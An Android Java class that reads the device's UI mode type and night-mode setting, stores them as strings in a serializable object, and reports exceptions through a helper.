package Transfer;

import android.app.UiModeManager;
import android.content.Context;
import android.os.Build.VERSION;
import com.android.engine.service.MyService;
import com.android.engine.ExceptionAction;
import java.io.Serializable;

import static android.app.UiModeManager.MODE_NIGHT_AUTO;
import static android.app.UiModeManager.MODE_NIGHT_NO;
import static android.app.UiModeManager.MODE_NIGHT_YES;

public class UiMode implements Serializable {

  public String CURRENTMODETYPE;
  public String NIGHTMODE;

  public UiMode() {
    try {
      if (VERSION.SDK_INT >= 8) {
        UiModeManager uiModeManager =
            (UiModeManager) MyService.context.getSystemService(Context.UI_MODE_SERVICE);
        if (uiModeManager.getCurrentModeType() == 0) {
          CURRENTMODETYPE = "Undefined";
        } else if (uiModeManager.getCurrentModeType() == 1) {
          CURRENTMODETYPE = "Normal";
        } else if (uiModeManager.getCurrentModeType() == 2) {
          CURRENTMODETYPE = "Desk";
        } else if (uiModeManager.getCurrentModeType() == 3) {
          CURRENTMODETYPE = "Car";
        } else if (uiModeManager.getCurrentModeType() == 4) {
          CURRENTMODETYPE = "Television";
        } else if (uiModeManager.getCurrentModeType() == 5) {
          CURRENTMODETYPE = "Appliance";
        } else if (uiModeManager.getCurrentModeType() == 6) {
          CURRENTMODETYPE = "Watch";
        } else if (uiModeManager.getCurrentModeType() == 15) {
          CURRENTMODETYPE = "Mask";
        }

        if (uiModeManager.getNightMode() == MODE_NIGHT_AUTO) {
          NIGHTMODE = "Auto";
          return;
        } else if (uiModeManager.getNightMode() == MODE_NIGHT_NO) {
          NIGHTMODE = "No";
          return;
        } else if (uiModeManager.getNightMode() == MODE_NIGHT_YES) {
          NIGHTMODE = "Yes";
          return;
        } else {
          return;
        }
      }
      throw new Exception(
          String.format("This feature requires SDK level %s. The device has level %s.",
              new Object[] { Integer.valueOf(8), Integer.valueOf(VERSION.SDK_INT) }));
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }
}
